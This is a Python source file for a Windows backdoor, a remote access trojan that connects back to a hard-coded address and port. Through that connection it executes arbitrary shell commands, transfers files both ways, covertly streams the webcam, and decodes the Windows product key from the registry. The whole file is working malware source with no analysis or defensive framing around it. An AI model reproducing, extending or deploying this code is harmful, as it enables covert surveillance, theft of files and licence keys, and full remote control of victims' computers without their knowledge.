import socket
import subprocess
import json
import os
import base64
import cv2
import threading
import time
import winreg
import wmi

class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        self.camera = cv2.VideoCapture(0)

    def decode_key(self, rpk):
        rpk_offset = 52
        i = 28
        possible_chars = "BCDFGHJKMPQRTVWXY2346789"
        product_key = ""

        while i >= 0:
            dw_accumulator = 0
            j = 14
            while j >= 0:
                dw_accumulator = dw_accumulator * 256
                d = rpk[j + rpk_offset]
                if isinstance(d, str):
                    d = ord(d)
                dw_accumulator = d + dw_accumulator
                rpk[j + rpk_offset] = int(dw_accumulator / 24) if int(dw_accumulator / 24) <= 255 else 255
                dw_accumulator = dw_accumulator % 24
                j = j - 1
            i = i - 1
            product_key = possible_chars[dw_accumulator] + product_key

            if ((29 - i) % 6) == 0 and i != -1:
                i = i - 1
                product_key = "-" + product_key
        return product_key

    def get_windows_product_key(self):
        try:
            w = wmi.WMI()
            product_key = w.softwarelicensingservice()[0].OA3xOriginalProductKey
            if product_key:
                return product_key
        except AttributeError:
            pass

        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, "DigitalProductID")
            return self.decode_key(list(value))
        except FileNotFoundError:
            return None

    def execute(self, command):
        try:
            return subprocess.check_output(command, shell=True, text=True)
        except subprocess.CalledProcessError:
            return "[+] Invalid command [+]"

    def send_json(self, data):
        json_data = json.dumps(data)
        self.s.send(json_data.encode())

    def recieve_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
        except OSError:
            return "Invalid path"
        return "Changed directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    def stream_webcam(self):
        while True:
            ret, frame = self.camera.read()
            if not ret:
                break

            _, buffer = cv2.imencode('.jpg', frame)
            frame_data = base64.b64encode(buffer).decode()
            self.send_json({"type": "webcam_frame", "data": frame_data})
            time.sleep(0.03)  # Adds 0.03 seconds delay before sending the next frame

    def run(self):
        webcam_thread = threading.Thread(target=self.stream_webcam, daemon=True)
        webcam_thread.start()

        while True:
            command = self.recieve_json()
            try:
                if command[0] == "exit":
                    self.s.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                elif command[0] == "get_windows_key":
                    command_output = self.get_windows_product_key()
                else:
                    command_output = self.execute(command)
            except Exception:
                command_output = "[+] Error during execution of the command [+]"
            self.send_json({"type": "command_output", "data": command_output})


backdoor = Backdoor("10.0.1.40", 4443)
backdoor.run()
